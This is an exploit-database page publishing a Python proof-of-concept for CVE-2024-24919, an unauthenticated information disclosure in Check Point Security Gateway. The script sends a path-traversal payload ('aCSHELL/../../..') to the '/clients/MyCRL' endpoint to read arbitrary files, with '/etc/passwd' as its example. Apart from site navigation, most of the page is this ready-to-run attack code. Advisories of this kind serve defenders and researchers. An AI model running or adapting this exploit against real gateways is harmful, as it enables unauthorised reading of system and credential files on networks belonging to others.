---
title: Check Point Security Gateway Information Disclosure
url: https://cxsecurity.com/issue/WLB-2024060023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-08
fetch_date: 2025-10-06T16:54:26.132092
---

# Check Point Security Gateway Information Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Check Point Security Gateway Information Disclosure** **2024.06.07**  Credit:  **[Yesith Alvarez](https://cxsecurity.com/author/Yesith%2BAlvarez/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-24919](https://cxsecurity.com/cveshow/CVE-2024-24919/ "Click to see CVE-2024-24919")**  CWE: **N/A** | |

# Exploit Title: Check Point Security Gateway - Information Disclosure (Unauthenticated)
# Exploit Author: Yesith Alvarez
# Vendor Homepage: https://support.checkpoint.com/results/sk/sk182336
# Version: R77.20 (EOL), R77.30 (EOL), R80.10 (EOL), R80.20 (EOL), R80.20.x, R80.20SP (EOL), R80.30 (EOL), R80.30SP (EOL), R80.40 (EOL), R81, R81.10, R81.10.x, R81.20
# CVE : CVE-2024-24919
from requests import Request, Session
import sys
import json
def title():
print('''
\_\_\_\_\_\_\_ \_\_\_\_\_\_\_\_ \_\_\_ \_\_\_ \_\_\_ \_ \_ \_\_\_ \_ \_ \_\_\_ \_\_ \_\_\_
/ \_\_\_\_\ \ / / \_\_\_\_| |\_\_ \ / \_ \\_\_ \| || | |\_\_ \| || | / \_ \/\_ |/ \_ \
| | \ \ / /| |\_\_ \_\_\_\_\_\_ ) | | | | ) | || |\_ \_\_\_\_\_\_ ) | || || (\_) || | (\_) |
| | \ \/ / | \_\_|\_\_\_\_\_\_/ /| | | |/ /|\_\_ \_|\_\_\_\_\_\_/ /|\_\_ \_\\_\_, || |\\_\_, |
| |\_\_\_\_ \ / | |\_\_\_\_ / /\_| |\_| / /\_ | | / /\_ | | / / | | / /
\\_\_\_\_\_| \/ |\_\_\_\_\_\_| |\_\_\_\_|\\_\_\_/\_\_\_\_| |\_| |\_\_\_\_| |\_| /\_/ |\_| /\_/
Author: Yesith Alvarez
Github: https://github.com/yealvarez
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
''')
def exploit(url, path):
url = url + '/clients/MyCRL'
data = "aCSHELL/../../../../../../../../../../.."+ path
headers = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
}
s = Session()
req = Request('POST', url, data=data, headers=headers)
prepped = req.prepare()
#del prepped.headers['Content-Type']
resp = s.send(prepped,
verify=False,
timeout=15
)
print(prepped.headers)
print(url)
print(resp.headers)
print(resp.status\_code)
if \_\_name\_\_ == '\_\_main\_\_':
title()
if(len(sys.argv) < 3):
print('[+] USAGE: python3 %s https://<target\_url> path\n'%(sys.argv[0]))
print('[+] EXAMPLE: python3 %s https://192.168.0.10 "/etc/passwd"\n'%(sys.argv[0]))
exit(0)
else:
exploit(sys.argv[1],sys.argv[2])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top